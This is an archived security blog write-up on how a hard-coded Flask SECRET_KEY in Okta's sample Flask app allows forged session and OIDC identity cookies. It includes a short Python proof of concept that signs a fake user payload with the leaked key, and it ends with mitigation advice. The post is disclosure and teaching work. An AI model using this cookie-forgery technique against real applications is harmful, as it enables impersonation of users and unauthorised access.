---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-01-31_flask-security.md
original_filename: 2022-01-31_flask-security.md
title: Flask Security
category: documents
detected_topics:
- jwt
- oauth
- access-control
- command-injection
- otp
- csrf
tags:
- imported
- documents
- jwt
- oauth
- access-control
- command-injection
- otp
- csrf
language: en
raw_sha256: 919c3490308958574ac4888c4120f01d58c1b844b39d347800f0c67f6fa5369c
text_sha256: b2382e667f3cfa301e47abc8a07abd0b8b2aa880dbb89af84c154fcc71d42062
ingested_at: '2026-06-28T07:32:09Z'
sensitivity: unknown
redactions_applied: true
---

# Flask Security

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-01-31_flask-security.md
- Source Type: markdown
- Detected Topics: jwt, oauth, access-control, command-injection, otp, csrf
- Ingested At: 2026-06-28T07:32:09Z
- Redactions Applied: True
- Raw SHA256: `919c3490308958574ac4888c4120f01d58c1b844b39d347800f0c67f6fa5369c`
- Text SHA256: `b2382e667f3cfa301e47abc8a07abd0b8b2aa880dbb89af84c154fcc71d42062`


## Content

---
title: "Flask Security"
page_title: "Flask Security · D4D blog"
url: "https://btlfry.gitlab.io/notes/posts/flask-security/"
final_url: "https://btlfry.gitlab.io/notes/posts/flask-security/"
authors: ["Zakhar Fedotkin / d4d (@d4d89704243)"]
bugs: ["OIDC", "Session management issue"]
publication_date: "2022-01-31"
added_date: "2024-02-06"
source: "pentester.land/writeups.json"
original_index: 2957
---

# Flask Security

Mon, Jan 31, 2022

Hard-coded credentials typically create a significant hole that allows an attacker to bypass the authentication that has been configured by the software administrator. Unfortunately this vulnerability might be difficult for the developers to detect. I’ll talk about the common misconfigurations at Flask powered applications and how malicious user can exploit vulnerability and how this risk can be mitigated.

### Vulnerability

Today I’ll talk about the common misconfigurations at Flask powered applications and how malicious user can exploit vulnerability and how this risk can be mitigated.

Not so long ago Ian Carroll published great article [Exploiting outdated Apache Airflow instances](https://ian.sh/airflow) about Apache Airflow vulnerability CVE-2020-17526: _Incorrect Session Validation in Apache Airflow Webserver versions prior to 1.10.14 with default config allows a malicious airflow user on site A where they log in normally, to access unauthorized Airflow Webserver on Site B through the session from Site A_. I wondered what other applications could be vulnerable to this type of attack. I decided to start with basic security requirements to flask applications. To get more information about topic I can recommend to read Luke Paris’s blog post [Baking Flask cookies with your secrets](https://blog.paradoxis.nl/defeating-flasks-session-management-65706ba9d3ce). All links could be found at Supporting Material section. In his research Luke found that most developers did not follow official documentation recommendation:
  
  
  Do not reveal the secret key when posting questions or committing code
  

I dicided to find all common default secrets used at GitHub now. One of such applications is [Flask Sample Applications for Okta](https://github.com/okta/samples-python-flask). Description of repo sounds promissing: _This example shows you how to use Flask to login to your application with a Custom Login page_. Further analysis showed that misconfiguration of Okta plugin will allows a malicious unauthorised user to get access to internal information on behalf of any user.

### Detailed description

Let’s run simple appliction as it is suggested by Readme file. Unauthorised request to http://localhost:8080/login will return response with anonimous cookies:
  
  
  Set-Cookie: oidc_id_token=;
  Set-Cookie: session=eyJvaWRjX2NzcmZfdG9rZW4iOiJ3QXR0djJ1VTh6THRYcDRGQmZXdXFaa2VVbS1vLWF1dCJ9.YQqJdA.jQRl7EpXNERRAwUYhWidsLxSifs;
  

Okta sample application’s web interface uses Flask’s stateless, signed cookies to store sensitive information. Signed cookies is simply a way of storing the current session data on the client (rather than the server) in such a way that it cannot (in theory) be tampered with. There are three main parts of signed cookie: `Session Data`.`Timestamp`.`Cryptographic Hash`, While at first glance it looks unreadable, but to those who recognise it, it’s actually just a Base64 encoded string `{'oidc_csrf_token': '-2uEdtBz0S2P2PawgH7x_inYu4zp_W8m'}` signed by Cryptographic Hash. This is the part which makes the cookie ‘secure’. Before the server sends you your latest session data, it calculates a sha1 hash based on the combination of your session data, current timestamp and the server’s secret key. Whenever the server then sees that session again, it will deconstruct the parts, and verify them using the same method. If the hash doesn’t match the given data, it will know it has been tampered with and will regard the session as invalid.

Let’s take a look on example Okta application. Most interesting part of config file:
  
  
  app = Flask(__name__)
  app.config.update({
  'SECRET_KEY': 'SomethingNotEntirelySecret',
  'OIDC_CLIENT_SECRETS': './client_secrets.json',
  'OIDC_ID_TOKEN_COOKIE_SECURE': False,
  'OIDC_SCOPES': ["openid", "profile", "email"],
  'OIDC_CALLBACK_ROUTE': '/authorization-code/callback'
  })
  

Vulnerable application uses easily predictable secret key to sign session cookie. Malicious user can forge any Flask ‘secure’ signed cookie using key `SomethingNotEntirelySecret`. Unfortunately for attacker it is not enough to completely bypass authorisation mechanism as OpenIDConnect library have own session handling logic. Luckily for us it relies on same `SECRET_KEY` as it shown at on source code of [flask-oidc](https://github.com/puiterwijk/flask-oidc). Session cookies is JWT token, signed by cryptographic hash calculated using same secret key.
  
  
  # create signers using the Flask secret key
  self.extra_data_serializer = JSONWebSignatureSerializer(
  app.config['SECRET_KEY'], salt='flask-oidc-extra-data')
  self.cookie_serializer = JSONWebSignatureSerializer(
  app.config['SECRET_KEY'])
  

To forge session cookie `oidc_id_token` malicious user should know `SECRET_KEY`. Hopefully it was discovered earlier so we are ready for final exploit. Payload signed with key `SomethingNotEntirelySecret` with expiration day in future should be packed to JWT token and sended to vulnerable server with cookie.

Sample exploit for this vulnerability presented below.
  
  
  from itsdangerous import JSONWebSignatureSerializer
  payload = {
  "sub": "0123456789abcdef",
  "name": "Test Name",
  "email": "attacker@example.com",
  "ver": 1,
  "iss": "https://example.com",
  "aud": "0123456789abcdef",
  "iat": 1000000000,
  "exp": 2000000001,
  "jti": "ID.0123456789abcdef-0123456789abcdef",
  "amr": [
  "pwd"
  ],
  "preferred_username": "attacker@example.com",
  "auth_time": 2000000001,
  "at_hash": "0123456789abcdef"
  }
  salts = [None,'flask-oidc-cookie','flask-oidc-extra-data']
  algs = [None,'HS256','HS512','HS384']
  for salt in salts:
  for alg in algs:
  cookie_serializer = JSONWebSignatureSerializer(secret_key=***REDACTED***
  print(cookie_serializer.dumps(payload).decode())
  

### Recommendation

There are multiple ways you could avoid this issue. The first and most obvious way of doing so is to simply never use default secrets! Make your secret key random. The most practical solution is to simply generate a UUID. This can be done on most Unix-like systems by using the uuid or uuidgen command, or by running the following on a machine with Python:
  
  
  $ python -c 'import uuid; print(uuid.uuid4());'
  

### Supporting Material/References:

  1. [Okta sample application](https://github.com/okta/samples-python-flask/releases/tag/1.0.0)
  2. [Flask Unsign tool](https://github.com/Paradoxis/Flask-Unsign)
  3. [Exploiting outdated Apache Airflow instances](https://ian.sh/airflow)
  4. [Baking Flask cookies with your secrets](https://blog.paradoxis.nl/defeating-flasks-session-management-65706ba9d3ce)
